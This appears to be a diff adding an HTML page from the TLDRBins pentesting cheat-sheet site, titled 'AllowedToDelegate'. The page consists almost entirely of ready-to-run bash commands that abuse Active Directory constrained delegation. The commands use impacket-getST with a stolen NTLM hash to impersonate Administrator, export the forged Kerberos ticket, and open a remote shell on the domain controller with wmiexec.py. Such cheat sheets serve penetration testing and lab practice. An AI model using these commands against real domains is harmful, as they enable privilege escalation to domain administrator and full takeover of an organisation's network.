@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>AllowedToDelegate | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/allowedtodelegate/">
+      <span>AllowedToDelegate</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@allowedtodelegate/">AllowedToDelegate</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@gmsadumper/">GMSADumper</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-driectory/">Active Driectory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="craft-a-ticket">Craft a Ticket</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># For example, spn: www/dc.example.com (Check Bloodhound)</span>
+</span></span><span class="line"><span class="cl">sudo ntpdate -s 10.10.11.10 <span class="o">&amp;&amp;</span> impacket-getST -dc-ip 10.10.11.10 -spn www/dc.example.com -hashes :&lt;HASH&gt; -impersonate Administrator example.com/username
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Export ccache</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
+</span></span><span class="line"><span class="cl">sudo ntpdate -s 10.10.11.10 <span class="o">&amp;&amp;</span> wmiexec.py -k -no-pass administrator@dc.example.com
+</span></span></code></pre></div><p><small><em>Note: impacket-wmiexec may not work</em></small></p>
+<br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
